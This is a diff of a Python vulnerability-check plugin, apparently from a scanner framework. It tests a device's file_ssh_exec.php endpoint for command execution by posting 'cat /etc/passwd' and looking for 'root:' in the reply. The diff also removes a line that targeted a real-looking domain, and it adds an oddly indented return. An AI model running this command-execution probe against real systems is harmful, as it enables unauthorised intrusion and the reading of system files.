@@ -27,7 +27,7 @@ def audit(arg):
         m = re.search(r'onclick="window\.open\(\'file_ssh_exec\.php\?action=user_query&id=([\d]*)\'\)" value="执行命令"', res)
         if m:
             exec_id = m.group(1)
-    post = 'cmd=cat+%2Fetc%2Fpasswd&action=user_cmd_submit&id='+str(exec_id)
+    post = 'cmd=cat+%2Fetc%2Fpasswd&action=user_cmd_submit&id='+exec_id
     #执行命令
     exec_url = arg + 'function/ssh/file_ssh_exec.php'
     code, head, res, err, _ = curl.curl2(exec_url, post=post)
@@ -51,7 +51,8 @@ def audit(arg):
     #print code, head, res, err
     if (code == 200) and 'root:' in res:
         security_hole('command execution: ' + arg + 'function/ssh/file_ssh_exec.php?action=get_real_content&lines=1&page_num=1&id='+exec_id)
+    
 
-if __name__ == '__main__':
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('topsec','https://www.njfyjf.com/')[1])
